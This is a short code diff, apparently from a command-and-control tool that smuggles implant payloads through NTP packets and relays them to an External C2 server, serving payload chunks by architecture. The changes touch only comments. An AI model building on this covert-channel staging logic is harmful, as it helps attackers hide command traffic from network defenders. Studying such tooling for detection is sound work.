@@ -91,7 +91,7 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
 	        send_frame(socket_extc2, "pipename=foobar", 15);
 	        send_frame(socket_extc2, "block=100", 9);
             
-            //get frames back
+            //get frames back, laod into client class
             */
         }
 
@@ -104,14 +104,14 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
             send_frame(socket_extc2, "pipename=foobar", 15);
             send_frame(socket_extc2, "block=100", 9);
 
-            //get frames back
+            //get frames back, load into client class
             */
         }
 
         else if (payloadArch == 0x00) {
             std::cout << "[?] 0x00 continuation of getting payload" << std::endl;
             
-            //access class and get next chunk to send back
+            //access class and get next chunk to send back. client must have req'd 0x86 or 0x64 FIRST, otherwise itll be empty.
         }
 
         else {
